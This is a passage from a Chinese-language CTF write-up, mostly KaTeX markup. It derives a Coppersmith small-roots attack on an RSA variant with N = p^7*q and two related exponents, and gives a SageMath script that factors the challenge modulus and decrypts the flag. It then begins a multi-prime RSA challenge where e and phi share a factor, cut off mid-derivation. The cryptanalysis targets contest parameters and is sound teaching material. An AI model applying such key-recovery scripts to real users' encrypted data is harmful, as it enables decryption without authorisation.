class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>e</mi><mn>1</mn></msub><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_1 * e_2 * (d_1 + x) \equiv e_1 \pmod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub><mo>∗</mo><mi>x</mi><mo>+</mo><msub><mi>e</mi><mn>1</mn></msub><mo>−</mo><msub><mi>e</mi><mn>2</mn></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">e_1 * e_2 * x + e_1 - e_2 = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.66666em;vertical-align:-.08333em"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.73333em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">0</span></span></span></span></span></p><p>参照一下论文：<a target="_blank" rel="noopener" href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub><mo>∗</mo><mi>x</mi><mo>+</mo><msub><mi>e</mi><mn>1</mn></msub><mo>−</mo><mi>e</mi><mn>2</mn><mo>≡</mo><mn>0</mn><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><msup><mi>p</mi><mn>6</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_1 * e_2 * x + e_1 - e2 \equiv 0 \pmod{p^6}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.66666em;vertical-align:-.08333em"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.73333em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">0</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mo>−</mo><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>≡</mo><mn>0</mn><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><msup><mi>p</mi><mn>6</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g(x) = x - x&#x27; \equiv 0 \pmod{p^6}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.03588em">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.66666em;vertical-align:-.08333em"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.801892em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.801892em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">0</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo>−</mo><msub><mi>e</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x&#x27; = (e_2 - e_1) * ((e_1 * e_2)^{-1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.801892em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.801892em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.864108em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>coppersmith 解出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">x</span></span></span></span>，之后就正常解即可</p><p>这好像还是强网杯的原题（</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977</span></span><br><span class="line">c = <span class="number">15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">e1 = <span class="number">8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221</span></span><br><span class="line">e2 = <span class="number">22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079</span></span><br><span class="line"></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">a = (e2 - e1) * invert(e1 * e2, N) % N</span><br><span class="line"><span class="comment"># assert a &lt; N</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = x - a</span><br><span class="line">x = f.small_roots(X=<span class="number">2</span>^<span class="number">675</span>, beta=<span class="number">0.65625</span>)</span><br><span class="line">x = x[<span class="number">0</span>]</span><br><span class="line">k_phi = e1 * e2 * x - (e2 - e1)</span><br><span class="line">p_k = gcd(<span class="built_in">int</span>(k_phi), N)</span><br><span class="line"></span><br><span class="line">p = gmpy2.iroot(<span class="built_in">int</span>(p_k), r - <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">q = N // (p**r)</span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="random">random</h3><p>由所给代码，我们可以通过爆破 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">base</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span></span></span></span> 去得到和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">n</span></span></span></span> 对应的素数列表，然后去得到素数对应的系数</p><p>根据多素数RSA系统的计算方式得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span>，但是这题的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">e</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span> 是不互素的</p><p>设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">e</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span> 的最大公约数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.625em;vertical-align:-.19444em"></span><span class="mord mathnormal" style="margin-right:.03588em">g</span></span></span></span>，推导如下：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>e</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">e&#x27;=e // g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.801892em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.801892em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">e</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:.03588em">g</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><msup><mi>e</mi><mrow><mo mathvariant="normal">′</mo><mrow><mo>−</mo><mn>1</mn></mrow></mrow></msup></mrow><annotation encoding="application/x-tex">d&#x27;=e&#x27;^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.801892em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.801892em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.864108em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.864108em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>此时有：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math 